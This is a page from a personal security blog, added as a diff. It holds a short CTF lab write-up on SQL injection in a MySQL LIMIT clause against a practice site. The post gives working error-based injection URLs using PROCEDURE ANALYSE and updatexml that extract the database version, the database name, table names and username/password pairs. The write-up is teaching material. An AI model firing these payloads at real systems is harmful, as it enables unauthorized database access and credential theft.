@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Mysql limit注入 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Mysql limit注入</h2>
+            <div class="post-date">2020-01-02</div>
+            
+            <div class="post-content">
+              <p><strong>实验环境</strong><br>
+http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1</p>
+<!-- more -->
+<p>查询结果如下<br>
+<img src="https://guokeya.github.io/post-images/1577948366827.png" alt="" loading="lazy"><br>
+猜测后台sql语句为</p>
+<pre><code>select * from test where id&lt;100 order by id limit $_GET['start'],$_GET['num']
+用户可控在limit语句后面
+</code></pre>
+<p><strong>注入语句</strong><br>
+limit 关键字后面还有 PROCEDURE 和 INTO 关键字，into 关键字可以用来写文件，但这在本文中不重要，这里的重点是 PROCEDURE 关键字.MySQL 默认可用的存储过程只有 ANALYSE (doc)。<br>
+输入单引号会报错，我们就用updatexml让其报错输出结果<br>
+<img src="https://guokeya.github.io/post-images/1577948405313.png" alt="" loading="lazy"><br>
+index.php?start=0 procedure analyse(updatexml(1,concat(0x7e,version()),1),1)%23&amp;num=1<br>
+<img src="https://guokeya.github.io/post-images/1577948415339.png" alt="" loading="lazy"><br>
+爆数据库名<br>
+index.php?start=0 procedure analyse(updatexml(1,concat(0x7e,database()),1),1)%23&amp;num=1<br>
+<img src="https://guokeya.github.io/post-images/1577948423058.png" alt="" loading="lazy"><br>
+爆表名<br>
+index.php?start=0 procedure analyse(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=0x6d79646273 limit 0,1)),1),1)%23&amp;num=1<br>
+<img src="https://guokeya.github.io/post-images/1577948431525.png" alt="" loading="lazy"></p>
+<p>之后操作就不再列举<br>
+直接获取数据<br>
+index.php?start=0 procedure analyse(updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from user limit 2,1)),1),1)%23&amp;num=1</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/metasploit-sheng-cheng-mian-sha-mu-ma/">
+                  <h3 class="post-title">
+                    Metasploit生成免杀木马
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
